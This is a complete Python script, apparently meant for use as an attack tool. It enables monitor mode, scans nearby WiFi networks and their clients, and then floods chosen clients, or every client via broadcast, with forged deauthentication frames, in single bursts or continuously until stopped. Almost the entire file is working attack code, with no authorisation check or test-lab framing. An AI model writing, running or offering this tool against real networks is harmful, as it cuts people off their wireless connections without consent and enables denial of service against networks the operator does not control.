#!/usr/bin/env python3
import os
import sys
import time
import subprocess
from scapy.all import *
from threading import Thread
import signal
import ctypes

class WiFiDeauthTool:
    def __init__(self):
        self.interface = None
        self.networks = {}
        self.clients = {}
        self.running = False
        self.target_bssid = None
        self.target_clients = []
        
    def check_root(self):
        """Check if running with root privileges"""
        if os.name == 'nt':
            try:
                if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                    print("[!] This script requires administrator privileges on Windows")
                    print("[!] Please run PowerShell/CMD as Administrator")
                    sys.exit(1)
            except Exception:
                # If the check fails, continue and let later operations decide capability.
                print("[!] Warning: could not verify administrator privileges on Windows")
            return

        geteuid = getattr(os, "geteuid", None)
        if callable(geteuid) and geteuid() != 0:
            print("[!] This script requires root privileges")
            print("[!] Please run with: sudo python3 wifi_deauth.py")
            sys.exit(1)
    
    def get_interfaces(self):
        """Get available wireless interfaces"""
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            interfaces = []
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    if line.strip():
                        interface = line.split()[0]
                        interfaces.append(interface)
            return interfaces
        except:
            return []

    def _extract_beacon_info(self, packet):
        """Extract SSID/channel/RSSI from a beacon packet safely."""
        ssid = ""
        channel = 0
        rssi = 0

        elt = packet.getlayer(Dot11Elt)
        while isinstance(elt, Dot11Elt):
            elt_id = getattr(elt, "ID", None)
            elt_info = getattr(elt, "info", b"") or b""

            if elt_id == 0 and not ssid:
                if isinstance(elt_info, bytes):
                    ssid = elt_info.decode("utf-8", errors="ignore")
                else:
                    ssid = str(elt_info)
            elif elt_id == 3 and channel == 0 and len(elt_info) > 0:
                try:
                    channel = elt_info[0] if isinstance(elt_info, bytes) else ord(elt_info)
                except Exception:
                    channel = 0

            elt = elt.payload.getlayer(Dot11Elt)

        if packet.haslayer(RadioTap):
            radiotap = packet[RadioTap]
            if hasattr(radiotap, "dBm_AntSignal"):
                try:
                    rssi = int(radiotap.dBm_AntSignal)
                except Exception:
                    rssi = 0

        if rssi == 0:
            notdecoded = getattr(packet, "notdecoded", b"")
            if isinstance(notdecoded, (bytes, bytearray)) and len(notdecoded) >= 4:
                try:
                    rssi = -(256 - notdecoded[-4])
                except Exception:
                    rssi = 0

        return ssid, channel, rssi
    
    def enable_monitor_mode(self, interface):
        """Enable monitor mode on the interface"""
        print(f"[*] Enabling monitor mode on {interface}")
        try:
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)
            time.sleep(2)
            
            # Start monitor mode
            result = subprocess.run(['airmon-ng', 'start', interface], capture_output=True, text=True)
            if result.returncode == 0:
                # Get the monitor interface name
                for line in result.stdout.split('\n'):
                    if 'monitor mode enabled' in line.lower():
                        monitor_iface = line.split()[-1]
                        print(f"[+] Monitor mode enabled on {monitor_iface}")
                        return monitor_iface
                return interface + 'mon'
            else:
                print(f"[!] Failed to enable monitor mode: {result.stderr}")
                return None
        except Exception as e:
            print(f"[!] Error enabling monitor mode: {e}")
            return None
    
    def disable_monitor_mode(self, interface):
        """Disable monitor mode"""
        try:
            subprocess.run(['airmon-ng', 'stop', interface], capture_output=True)
            subprocess.run(['service', 'network-manager', 'start'], capture_output=True)
            print("[*] Monitor mode disabled")
        except:
            pass
    
    def packet_handler(self, packet):
        """Handle captured packets"""
        if packet.haslayer(Dot11Beacon):
            # Extract beacon frame info
            ssid, channel, rssi = self._extract_beacon_info(packet)
            bssid = packet[Dot11].addr2
            
            if bssid not in self.networks:
                self.networks[bssid] = {
                    'ssid': ssid,
                    'channel': channel,
                    'rssi': rssi,
                    'clients': set()
                }
                print(f"[+] Found network: {self.networks[bssid]['ssid']} ({bssid})")
        
        elif packet.haslayer(Dot11) and packet.type == 2 and packet.subtype == 8:
            # Probe request - detect clients
            client_bssid = packet.addr2
            ap_bssid = packet.addr1
            
            if ap_bssid in self.networks and client_bssid not in self.networks[ap_bssid]['clients']:
                self.networks[ap_bssid]['clients'].add(client_bssid)
                print(f"[+] Client detected: {client_bssid} connected to {self.networks[ap_bssid]['ssid']}")
    
    def scan_networks(self, duration=30):
        """Scan for available WiFi networks"""
        print(f"[*] Scanning for networks (duration: {duration} seconds)...")
        self.networks.clear()
        
        def scan_thread():
            sniff(iface=self.interface, prn=self.packet_handler, timeout=duration, store=0)
        
        thread = Thread(target=scan_thread)
        thread.start()
        
        # Show progress
        for i in range(duration):
            if not self.running:
                break
            sys.stdout.write(f"\r[*] Scanning... {i+1}/{duration}")
            sys.stdout.flush()
            time.sleep(1)
        
        thread.join()
        print(f"\n[*] Scan complete. Found {len(self.networks)} networks")
        return self.networks
    
    def display_networks(self):
        """Display discovered networks"""
        if not self.networks:
            print("[!] No networks found")
            return
        
        print("\n" + "="*80)
        print(f"{'#':<3} {'SSID':<30} {'BSSID':<18} {'Channel':<8} {'RSSI':<6} {'Clients':<10}")
        print("="*80)
        
        for i, (bssid, info) in enumerate(self.networks.items(), 1):
            ssid = info['ssid'] if info['ssid'] else '[Hidden]'
            clients_count = len(info['clients'])
            print(f"{i:<3} {ssid[:30]:<30} {bssid:<18} {info['channel']:<8} {info['rssi']:<6} {clients_count:<10}")
        
        print("="*80)
    
    def deauth_attack(self, bssid, clients, count=100):
        """Perform deauthentication attack"""
        print(f"[*] Starting deauthentication attack on {self.networks[bssid]['ssid']}")
        print(f"[*] Target BSSID: {bssid}")
        print(f"[*] Target clients: {clients}")
        
        # Create deauthentication packet
        packet = RadioTap()/Dot11(type=0, subtype=12, addr1=clients[0], addr2=bssid, addr3=bssid)/Dot11Deauth(reason=3)
        
        try:
            for i in range(count):
                if not self.running:
                    break
                for client in clients:
                    packet.addr1 = client
                    sendp(packet, iface=self.interface, verbose=False)
                if i % 10 == 0:
                    sys.stdout.write(f"\r[*] Sent {i+1} deauth packets")
                    sys.stdout.flush()
                time.sleep(0.1)
            print(f"\n[+] Deauthentication attack completed")
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
        except Exception as e:
            print(f"\n[!] Error during attack: {e}")
    
    def continuous_deauth(self, bssid, clients):
        """Continuous deauthentication until stopped"""
        print(f"[*] Starting continuous deauthentication attack")
        print(f"[*] Press Ctrl+C to stop")
        
        packet = RadioTap()/Dot11(type=0, subtype=12, addr1=clients[0], addr2=bssid, addr3=bssid)/Dot11Deauth(reason=3)
        
        try:
            packet_count = 0
            while self.running:
                for client in clients:
                    packet.addr1 = client
                    sendp(packet, iface=self.interface, verbose=False)
                    packet_count += 1
                if packet_count % 10 == 0:
                    sys.stdout.write(f"\r[*] Sent {packet_count} deauth packets (Press Ctrl+C to stop)")
                    sys.stdout.flush()
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n[!] Attack stopped. Total packets sent: {packet_count}")
        except Exception as e:
            print(f"\n[!] Error during attack: {e}")
    
    def signal_handler(self, signum, frame):
        """Handle Ctrl+C signal"""
        print("\n[!] Stopping operations...")
        self.running = False
    
    def run(self):
        """Main program loop"""
        self.check_root()
        
        # Setup signal handler
        signal.signal(signal.SIGINT, self.signal_handler)
        
        print("="*60)
        print("WiFi Deauthentication Tool")
        print("="*60)
        
        # Get available interfaces
        interfaces = self.get_interfaces()
        if not interfaces:
            print("[!] No wireless interfaces found")
            sys.exit(1)
        
        print("\nAvailable wireless interfaces:")
        for i, iface in enumerate(interfaces, 1):
            print(f"{i}. {iface}")
        
        # Select interface
        try:
            choice = int(input("\nSelect interface (enter number): ")) - 1
            if choice < 0 or choice >= len(interfaces):
                print("[!] Invalid selection")
                sys.exit(1)
            selected_interface = interfaces[choice]
        except ValueError:
            print("[!] Invalid input")
            sys.exit(1)
        
        # Enable monitor mode
        monitor_iface = self.enable_monitor_mode(selected_interface)
        if not monitor_iface:
            print("[!] Failed to enable monitor mode")
            sys.exit(1)
        
        self.interface = monitor_iface
        self.running = True
        
        try:
            while self.running:
                print("\n" + "="*60)
                print("Main Menu:")
                print("1. Scan for networks")
                print("2. Display discovered networks")
                print("3. Deauth attack (single burst)")
                print("4. Continuous deauthentication")
                print("5. Change interface")
                print("6. Exit")
                print("="*60)
                
                try:
                    choice = input("\nSelect option: ").strip()
                    
                    if choice == '1':
                        duration = input("Scan duration in seconds (default 30): ").strip()
                        duration = int(duration) if duration.isdigit() else 30
                        self.scan_networks(duration)
                    
                    elif choice == '2':
                        self.display_networks()
                    
                    elif choice == '3':
                        if not self.networks:
                            print("[!] No networks scanned yet. Please scan first.")
                            continue
                        
                        self.display_networks()
                        try:
                            net_choice = int(input("\nSelect network number: ")) - 1
                            network_list = list(self.networks.keys())
                            if net_choice < 0 or net_choice >= len(network_list):
                                print("[!] Invalid selection")
                                continue
                            
                            target_bssid = network_list[net_choice]
                            clients = list(self.networks[target_bssid]['clients'])
                            
                            if not clients:
                                print("[!] No clients detected on this network")
                                print("[!] Using broadcast deauthentication")
                                clients = ["ff:ff:ff:ff:ff:ff"]
                            
                            print(f"\nTarget: {self.networks[target_bssid]['ssid']}")
                            print(f"Available clients: {clients}")
                            
                            client_choice = input("Select client (enter BSSID or press Enter for all): ").strip()
                            if client_choice and client_choice in clients:
                                target_clients = [client_choice]
                            else:
                                target_clients = clients
                            
                            packet_count = input("Number of packets to send (default 100): ").strip()
                            packet_count = int(packet_count) if packet_count.isdigit() else 100
                            
                            self.deauth_attack(target_bssid, target_clients, packet_count)
                            
                        except ValueError:
                            print("[!] Invalid input")
                    
                    elif choice == '4':
                        if not self.networks:
                            print("[!] No networks scanned yet. Please scan first.")
                            continue
                        
                        self.display_networks()
                        try:
                            net_choice = int(input("\nSelect network number: ")) - 1
                            network_list = list(self.networks.keys())
                            if net_choice < 0 or net_choice >= len(network_list):
                                print("[!] Invalid selection")
                                continue
                            
                            target_bssid = network_list[net_choice]
                            clients = list(self.networks[target_bssid]['clients'])
                            
                            if not clients:
                                print("[!] No clients detected on this network")
                                print("[!] Using broadcast deauthentication")
                                clients = ["ff:ff:ff:ff:ff:ff"]
                            
                            print(f"\nTarget: {self.networks[target_bssid]['ssid']}")
                            print(f"Available clients: {clients}")
                            
                            client_choice = input("Select client (enter BSSID or press Enter for all): ").strip()
                            if client_choice and client_choice in clients:
                                target_clients = [client_choice]
                            else:
                                target_clients = clients
                            
                            print("\n[*] Starting continuous deauthentication attack")
                            print("[*] Press Ctrl+C to stop")
                            self.continuous_deauth(target_bssid, target_clients)
                            
                        except ValueError:
                            print("[!] Invalid input")
                    
                    elif choice == '5':
                        # Change interface
                        self.disable_monitor_mode(self.interface)
                        interfaces = self.get_interfaces()
                        if not interfaces:
                            print("[!] No wireless interfaces found")
                            continue
                        
                        print("\nAvailable wireless interfaces:")
                        for i, iface in enumerate(interfaces, 1):
                            print(f"{i}. {iface}")
                        
                        try:
                            iface_choice = int(input("\nSelect interface (enter number): ")) - 1
                            if iface_choice < 0 or iface_choice >= len(interfaces):
                                print("[!] Invalid selection")
                                continue
                            selected_interface = interfaces[iface_choice]
                            
                            monitor_iface = self.enable_monitor_mode(selected_interface)
                            if not monitor_iface:
                                print("[!] Failed to enable monitor mode")
                                continue
                            
                            self.interface = monitor_iface
                            self.networks.clear()
                            print(f"[*] Interface changed to {monitor_iface}")
                            
                        except ValueError:
                            print("[!] Invalid input")
                    
                    elif choice == '6':
                        print("[*] Exiting...")
                        self.running = False
                    
                    else:
                        print("[!] Invalid option")
                
                except KeyboardInterrupt:
                    print("\n[!] Operation cancelled")
                    continue
        
        finally:
            # Clean up
            if self.interface:
                self.disable_monitor_mode(self.interface)
            print("[*] Program terminated")

def main():
    tool = WiFiDeauthTool()
    tool.run()

if __name__ == "__main__":
    main()
